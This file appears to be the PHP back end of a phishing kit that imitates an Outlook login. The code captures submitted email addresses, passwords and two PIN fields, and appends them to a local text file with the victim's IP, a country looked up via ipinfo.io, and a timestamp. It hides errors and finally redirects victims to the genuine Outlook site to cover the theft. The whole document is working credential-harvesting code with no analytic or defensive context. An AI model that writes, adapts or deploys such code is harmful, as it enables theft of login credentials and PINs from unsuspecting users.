<?php
@date_default_timezone_set('America/Caracas');
@ini_set("display_errors", 0);
$user_ip = $_SERVER['REMOTE_ADDR'];
$cc = trim(file_get_contents("http://ipinfo.io/{$user_ip}/country"));

$file = fopen("juanpi.txt", "a");
if(isset($_POST['mail']) && isset($_POST['pass'])){
fwrite($file, "correo: ".$_POST['mail']." - Psswrd: ".$_POST['pass']." -  ");
header ('location: index2.html');
}
if(isset($_POST['pin1']) && isset($_POST['pin2'])){
fwrite($file, "pin: ".$_POST['pin1']."  pin: ".$_POST['pin2']."  ".date('Y-m-d')." - ".date('H:i:s')." ".$user_ip." ".$cc."  ". PHP_EOL);
fwrite($file, "------------------------" . PHP_EOL);
header ('location: https://outlook.live.com/owa/');
}

fclose($file);
